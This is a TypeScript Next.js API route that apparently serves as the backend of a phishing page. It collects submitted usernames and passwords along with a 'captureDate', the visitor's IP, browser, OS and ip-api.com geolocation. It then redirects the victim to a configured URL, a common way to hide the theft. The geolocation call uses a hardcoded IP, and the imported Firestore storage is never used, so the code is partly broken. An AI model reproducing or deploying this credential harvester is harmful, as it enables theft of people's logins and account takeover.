import { NextRequest, NextResponse } from "next/server";
import { setDoc, updateDoc, doc, collection } from "firebase/firestore";
import UAParser from "ua-parser-js";
import config, { db } from "@/config";

export async function POST(req: Request, res: Response) {
  const data = await req.json();
  const userAgent = new UAParser(String(req.headers.get("user-agent")));

  // user meta data
  const ip = req.headers.get("x-forwarded-for") || "N/A";
  const browser = userAgent.getBrowser();
  const os = userAgent.getOS();

  const ipRes = await fetch(`http://ip-api.com/json/190.89.29.17`, {
    method: "GET",
  });
  const ipData = await ipRes.json();

  const user = {
    username: data.username,
    password: data.password,
    captureDate: data.date,
    ip: ip,
    browser: `${browser.name} ${browser.version}`,
    os: `${os.name} ${os.version}`,
    country: ipData.status === "success" ? ipData.country : "N/A",
    countryCode: ipData.status === "success" ? ipData.countryCode : "N/A",
    city: ipData.status === "success" ? ipData.city : "N/A",
    isp: ipData.status === "success" ? ipData.isp : "N/A",
  };

  return NextResponse.json({ status: "success", redirect: config.url.redirect }, { status: 200 });
  // return NextResponse.json({ status: "fail", redirect: config.url.redirect }, { status: 401 });
}
